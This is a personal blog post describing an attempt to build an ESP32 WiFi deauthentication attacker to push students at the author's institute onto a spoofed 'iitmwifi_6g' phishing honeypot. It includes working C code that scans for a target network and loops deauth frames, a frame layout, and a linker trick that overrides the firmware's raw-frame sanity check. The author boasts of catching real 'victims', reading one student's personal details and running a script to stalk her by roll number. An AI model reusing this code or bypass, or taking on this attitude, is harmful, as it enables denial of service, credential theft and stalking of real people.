+++
title = "WiFi spoofing part B: Creating an ESP32 based WiFi deauther"
date = 2025-01-23
draft = false

[taxonomies]
categories = ["Hacking", "Hardware"]
tags = ["Hardware", "Networks", "Cysec", "blog", "ESP32"]

[extra]
lang = "en"
+++

ESP32 has a wifi adapter inbuilt. It also apparently allows you to send raw wifi packets if you use the ESP-IDF framework and the `ieee80211_raw_frame_sanity_check()`, an actual bypass that was found after reverse engineering the ESP-IDF source code and binaries. 

The reason I wanna do this is because otherwise people won't be incentivised to click on my honepot, 2 reasons for this

1. It is free and hence less trustworth in the minds of the people
2. People generally don't check available networks (cause most of the times, their phones automatically connect)

If I can broadcast deauthentication frames posing as my insti AP, and then perform a DoS attack, they will be forced to notice my "iitmwifi_6g" and boom, gotcha!

> TLDR: It did not work, because ESP-IDF won't support sending deauth frames and the working behind the actual raw packet sending is closed source. We will have to use a custom framework and not ESP-IDF, thus a new board like ESP8266. 

I shall do this for another time. If you are `still interested` in going through what I learnt in this frustating process, read through...

## Installing ESP-IDF v5.4 (latest)

The first thing I found that should be done to send raw wifi packets is to use `esp_wifi_80211_tx()` which is a low level API that directly talks to the ESP32 wifi adapter. In order to do that I had to install ESP-IDF and I naively installed the latest version (reasons for the naivety will be clear soon).

[The ESP-IDF](https://docs.espressif.com/projects/esp-idf/en/stable/esp32/get-started/linux-macos-setup.html) website is the best guide to follow, and I did exactly as they mentioned.

- Problems in deauth frames

Here is how I was trying to send the deauth frames

```c
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_event.h"
#include "esp_netif.h"

static const char *TAG = "DEAUTH";
#define TARGET_SSID "motog73"

void wifi_scan_and_deauth() {
    ESP_LOGI(TAG, "Inside wifi scan and deauth");

    // Scan configuration
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };

    // Perform scan
    esp_err_t scan_result = esp_wifi_scan_start(&scan_config, true);
    if (scan_result != ESP_OK) {
        ESP_LOGE(TAG, "Scan start failed: %s", esp_err_to_name(scan_result));
        return;
    }

    // Get number of APs
    uint16_t ap_count = 0;
    esp_err_t ap_num_result = esp_wifi_scan_get_ap_num(&ap_count);
    if (ap_num_result != ESP_OK) {
        ESP_LOGE(TAG, "Get AP number failed: %s", esp_err_to_name(ap_num_result));
        return;
    }

    ESP_LOGI(TAG, "Found %d access points", ap_count);

    // Allocate AP records
    wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
    esp_err_t ap_records_result = esp_wifi_scan_get_ap_records(&ap_count, ap_records);
    if (ap_records_result != ESP_OK) {
        ESP_LOGE(TAG, "Get AP records failed: %s", esp_err_to_name(ap_records_result));
        free(ap_records);
        return;
    }

    // Find target network
    uint8_t target_bssid[6] = {0};
    bool target_found = false;
    for (int i = 0; i < ap_count; i++) {
        ESP_LOGI(TAG, "Found AP: %s", ap_records[i].ssid);
        if (strcmp((char*)ap_records[i].ssid, TARGET_SSID) == 0) {
            memcpy(target_bssid, ap_records[i].bssid, 6);
            target_found = true;
            break;
        }
    }

    if (!target_found) {
        ESP_LOGE(TAG, "Target SSID '%s' not found", TARGET_SSID);
        free(ap_records);
        return;
    }

    // Switch to AP Mode (Required for sending deauth)
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

    // Deauth frame
    uint8_t deauth_frame[26] = {
        0x0c, 0x00,   // Frame Control (Deauth)
        0x00, 0x00,   // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Receiver Address (Broadcast)
        target_bssid[0], target_bssid[1], target_bssid[2], 
        target_bssid[3], target_bssid[4], target_bssid[5],  // Source Address (AP)
        target_bssid[0], target_bssid[1], target_bssid[2], 
        target_bssid[3], target_bssid[4], target_bssid[5],  // BSSID (AP)
        0x00, 0x00,   // Fragment and Sequence Number
        0x07, 0x00    // Reason Code: Class 3 frame received from nonassociated station
    };

    // Send deauth frame

    while(true){
    esp_err_t tx_result = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
    if (tx_result != ESP_OK) {
        ESP_LOGE(TAG, "Deauth frame transmission failed: %s", esp_err_to_name(tx_result));
    } else {
        ESP_LOGI(TAG, "Deauth frame sent successfully");
    }

    vTaskDelay(pdMS_TO_TICKS(100));
}
}

void app_main() {
    ESP_LOGI(TAG, "Starting!");

    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialize network interface
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    // Initialize WiFi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // Use AP + STA Mode to enable both scanning and deauth
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_start());

    // Scan and deauth
    wifi_scan_and_deauth();
}
```

The rest is basically boiler plate code that you can find in the `examples` section, but the important one was the structure of the deauthentication frame. You can find the exact structure implementation in this [blog post](https://blog.spacehuhn.com/wifi-deauthentication-frame) and this is what I copied.

The idea here being that we first scan for a certain SSID which is basically the wifi's name and through that find its BSSID which is the Access Point's MAC address (physical address). Now, according to the blog post the structure of the frame should be something like this,

```c
uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};
```

Yeah they did mention that this is supposed to be for ESP8266 cause it internally handles the rest.

> You might notice that some data is left out of this array. For example, the frame check sequence (FCS) is not defined here. That's because it's already handled by the underlying ESP8266 SDK functions automatically. 

But as far as I know, it didn't seem to make a difference, because the error I got was 

> [!TIP]
> 0xC0 is an unsupported frame type

Well this means that there is nothing I can do now! I tried changing it to `0xA0` which is the authentication frame and used the authentication frame setup but ESP-IDF won't allow that as well. The only thing that it sends properly is the action frame (`0xD0`) but I didn't extensively test this out yet.

okay, its been a few hours and I learnt that support for `0xC0` was removed in versions 5.2 and above. We'll that gives something new to try now!

## Installing lower versions

Man! The problem with cloning this is that its so fucking big, and a bad internet connection (unstable or slow) means you will never be able to do it because it will inevitably drop frames.

Had to rush to the library for this, it gives 4Mbps which is good enough and stable enough. This is the cloning script I am using now,

```sh
mkdir -p ~/esp
cd ~/esp
git clone -b v5.2 --recursive https://github.com/espressif/esp-idf.git
```

Ran the same c code again, and it won't work. Getting the same error. Some sources are pointing at an even lower version (4.2 now). Honestly I have zero hopes but lets give that as well a try.

```sh
mkdir -p ~/esp
cd ~/esp
git clone -b v4.2 --recursive https://github.com/espressif/esp-idf.git
```

Uploaded, ran and hahaha, didn't work.

## Trying action frames 

So, since action frames work, I am going to try something with `0xD0`. Reading more on action frames, I figured this out

> The Channel Switch Announcement element is used by an AP in a BSS, a STA in an IBSS, or a mesh STA in an MBSS to advertise when it is changing to a new channel and the channel number of the new channel. The format of the Channel Switch Announcement element is shown below (source IEEE 802.11-2012)

{{ figure(src="assets/IEEE_802_11_2012.png", alt="CSA element format diagram", caption="CSA format diagram") }}

The idea being that a `Channel Switch Annoucement` can potentially be used to deauthenticate a user. If for example you're connected to your wifi using channel 1 and it suddenly asks you to switch to channel 6 then there **might** be a small time interval of disconnect followed by a reconnect.

If we can time this perfectly and send multiple CSA signals with different channels each time, the switching can be such that at any given time the connection is not present! Thus, the user will feel the need to check the wifi networks and boom, goal achieved.

So, I tried this but... either my ESP is cupping or this ain't working. I mean it did seem too easy... why would they go and remove support for deauth frames and leave action frames if they were equally harmful?

## Trying to reverse the ESP-IDF library 

From what I learnt, it is definetly not a hardware issue cause the ESP32 chip **can** send raw wifi packets. I know its the ESP-IDF library. So, if we patch the software -- we can allow deauth frames to be sent!

I am pretty sure this has been done before, but maybe that patch was also patched? (get it?)

### Finding esp_wifi_80211_tx

The problem is mostly in the implementation of `esp_wifi_80211_tx()`. It's stopping us from sending a frame starting with 0xd0 and 0xa0 or something. 

These are all the files that have "esp_wifi_80211_tx" referenced. We'll probably have to look at each of them one by one.

		components/esp_wifi/test_apps/wifi_connect/main/test_wifi_conn.c:        `esp_wifi_80211_tx`(WIFI_IF_AP, ds2ds_pdu, sizeof(ds2ds_pdu), true);
		components/esp_wifi/include/esp_wifi.h:  *            Generally, if `esp_wifi_80211_tx` is called before the Wi-Fi connection has been set up, both
		components/esp_wifi/include/esp_wifi.h:esp_err_t `esp_wifi_80211_tx`(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

Its present in certain docs as well. This will probably not be very useful 

		docs/en/api-guides/wifi.rst:Meanwhile, :cpp:func:`esp_wifi_80211_tx` is supported at sleep as well.
		docs/en/api-guides/wifi.rst:The :cpp:func:`esp_wifi_80211_tx()` API can be used to:
		docs/en/api-guides/wifi.rst:Preconditions of Using :cpp:func:`esp_wifi_80211_tx()`

		docs/en/api-guides/wifi.rst: - Either ``esp_wifi_set_promiscuous(true)``, or :cpp:func:`esp_wifi_start()`, or both of these APIs return :c:macro:`ESP_OK`. This is because Wi-Fi hardware must be initialized before :cpp:func:`esp_wifi_80211_tx()` is called. In {IDF_TARGET_NAME}, both ``esp_wifi_set_promiscuous(true)`` and :cpp:func:`esp_wifi_start()` can trigger the initialization of Wi-Fi hardware.

		docs/en/api-guides/wifi.rst: - The parameters of :cpp:func:`esp_wifi_80211_tx()` are hereby correctly provided.

		docs/en/api-guides/wifi.rst:Theoretically, if the side-effects the API imposes on the Wi-Fi driver or other stations/APs are not considered, a raw 802.11 packet can be sent over the air with any destination MAC, any source MAC, any BSSID, or any other types of packet. However, robust or useful applications should avoid such side-effects. The table below provides some tips and recommendations on how to avoid the side-effects of :cpp:func:`esp_wifi_80211_tx()` in different scenarios.

		docs/en/api-guides/wifi.rst:       Side-effect example#1 The application calls :cpp:func:`esp_wifi_80211_tx()` to send a beacon with BSSID == mac_x in AP mode, but the mac_x is not the MAC of the AP interface. Moreover, there is another AP, e.g., “other-AP”, whose BSSID is mac_x. If this happens, an “unexpected behavior” may occur, because the stations which connect to the “other-AP” cannot figure out whether the beacon is from the “other-AP” or the :cpp:func:`esp_wifi_80211_tx()`.

		docs/en/api-guides/wifi.rst:       - If :cpp:func:`esp_wifi_80211_tx` is called in station mode, the first MAC should be a multicast MAC or the exact target-device’s MAC, while the second MAC should be that of the station interface.

		docs/en/api-guides/wifi.rst:       - If :cpp:func:`esp_wifi_80211_tx` is called in AP mode, the first MAC should be a multicast MAC or the exact target-device’s MAC, while the second MAC should be that of the AP interface.

Checking `components/esp_wifi/include/esp_wifi.h` and this is the metadata we find

		/**
		  * @brief     Send raw ieee80211 data
		  *
		  * @attention Currently only support for sending beacon/probe request/probe response/action and non-QoS
		  *            data frame
		  *
		  * @param     ifx interface if the Wi-Fi mode is Station, the ifx should be WIFI_IF_STA. If the Wi-Fi
		  *            mode is SoftAP, the ifx should be WIFI_IF_AP. If the Wi-Fi mode is Station+SoftAP, the
		  *            ifx should be WIFI_IF_STA or WIFI_IF_AP. If the ifx is wrong, the API returns ESP_ERR_WIFI_IF.
		  * @param     buffer raw ieee80211 buffer
		  * @param     len the length of raw buffer, the len must be <= 1500 Bytes and >= 24 Bytes
		  * @param     en_sys_seq indicate whether use the internal sequence number. If en_sys_seq is false, the
		  *            sequence in raw buffer is unchanged, otherwise it will be overwritten by WiFi driver with
		  *            the system sequence number.
		  *            Generally, if esp_wifi_80211_tx is called before the Wi-Fi connection has been set up, both
		  *            en_sys_seq==true and en_sys_seq==false are fine. However, if the API is called after the Wi-Fi
		  *            connection has been set up, en_sys_seq must be true, otherwise ESP_ERR_INVALID_ARG is returned.
		  *
		  * @return
		  *    - ESP_OK: success
		  *    - ESP_ERR_WIFI_IF: Invalid interface
		  *    - ESP_ERR_INVALID_ARG: Invalid parameter
		  *    - ESP_ERR_WIFI_NO_MEM: out of memory
		  */


> [NOTE]
> Currently only support for sending beacon/probe request/probe response/action and non-QoS data frame

This is exactly what we want to bypass.

I was being too ambitious. After a bit of researching I found that the implementation of this function is mostly likely close-sourced. Thus, even replicating the certain specifics is going to be difficult as fuck.

## Alternative approach

https://github.com/GANESH-ICMC/esp32-deauther/

Found this cool github project that supposedly bypasses the `invalid arguments` error and sends the deauth frames anyway without using the in-built `idf.py build` function. This was the `patch` that I claimed would've been done before...

So, this requires us to use `make` instead of `idf.py build`, What exactly is the difference between `idf.py build` and `make`? I don't know. Going through issue#3 tells that

		- Hi Garfius, I'm interested in this project, where can I download the Built v4.1-dev-763-ga45e99853? does it also work with the latest 4.1 dev on the site at https://github.com/espressif/esp-idf/releases/tag/v4.1-dev?

		reply: Yes, it works with idf 4.1

So, there goes another day of installing a new esp-idf version! That's one. Also, the open pull request (#14) suggests a method to use idf.py instead of `make` which is now considered legacy.

This is done by adding this line

		target_link_libraries(${COMPONENT_LIB} -Wl,-zmuldefs)

at the end of the `CMakeLists.txt` inside the `main` directory. 

Quoting the author of the PR:

> In compiled [ESP32 WiFi Stack libraries](https://github.com/espressif/esp32-wifi-lib) there is a function `ieee80211_raw_frame_sanity_check` that blocks some types of raw 802.11 frames from being sent. Using `zmuldefs` linker flag during compilation (see `main/CMakeLists.txt`) this function from WiFi Stack librabries can be overriden to always return `0` which leads to unrestricted raw frame transmission.

So now the procedure becomes

1. Clone the esp-idf v4.1 
2. Install the requirements and build it properly using `esp-idf build`
3. Flash it and monitor (`idf.py flash && idf.py monitor`)

Going through issue#10 in that,

		Hi and thank you for the work provided !
		I built the project with make (I used the exact esp-idf commit you provided in readme), applyed the patch and flashed the device, everything works great (although I had to run "idf.py build" before anything to build the partition_table folders and files..., it may be added to the readme...).
		So I started the device, connected to Putty via Serial where I can see the deauth messages flowing without error ... but nothing else happen...
		I replaced the MAC address of my Wifi AP in main.cpp and let the TARGET address as is (FF:FF:FF:FF:FF:FF).
		I can't see any deauth or deassoc in wireshark (filter "wlan.fc.type_subtype eq 0xc or wlan.fc.type_subtype eq 0xa") and my computer (connected to this AP) shows steady wifi connexion....
		Am I missing something ? How did you debug such case ? Thank you !

From what I can paraphrase, the AP address needs to be changed and the Target address can remain the broadcast. 

I will first have to find the MAC address for the AP I am trying to target. I have a scanning code, I will use that. 

#### Starting 

First, cloning esp-idf 4.1. Alright this uses `python` and not `python3`. We will have the fix the shebang in the `tools/idf_tools.py` file. 

`#!/usr/bin/env python` becomes `#!/usr/bin/env python3`

also fix the bash sheband in the install script to `#!/bin/bash`

Then using `. ./export.sh` to source the local enviornment.

First, lets test the actual [deatuh script](LinkToIt) (with the 0xC0 byte set) to see if this downgraded version allows this or not. If not then we'll try and bypass. 

---

Meanwhile also add supabase setup for the spoofing page. Why is it not connecting to the board! Packing for lunch.

Haha, got 2 more victims in this 1 hour of lunching. Interesting, the girl has a cgpa of 8.23 but interned in the defence agency and PnG? Crazy stuff. Makes one wonder. Running my elective script to stalk this girl with roll number ee22b143 for a friend (really for a friend!)

My honeypot code is below, its really simple actually but quite fun.

---

Alright, __unsupported frame__ type again for 0xC0. I guess they had removed support for 0xC0 in all versions of esp-idf. Testing the GitHub repo patch now.

I don't think its working. Two explanations

1. The code doesn't work
2. The WiFi system is secured against it (which is very very likely cause it might be a standard protocol nowadays)

---

Well, until I figure something else, I guess I will have to make do with my honeypot and hope people notice an "iitmwifi_6g" and click on that. I have opened an issue explaining my dilema. Let's see.

## Important links

1. https://docs.espressif.com/projects/esp-idf/en/stable/esp32/get-started/linux-macos-setup.html
2. https://blog.spacehuhn.com/wifi-deauthentication-frame
3. https://randomnerdtutorials.com/esp32-useful-wi-fi-functions-arduino/
4. https://github.com/GANESH-ICMC/esp32-deauther/issues/26

This is still yet to be tested

5. https://github.com/risinek/esp32-wifi-penetration-tool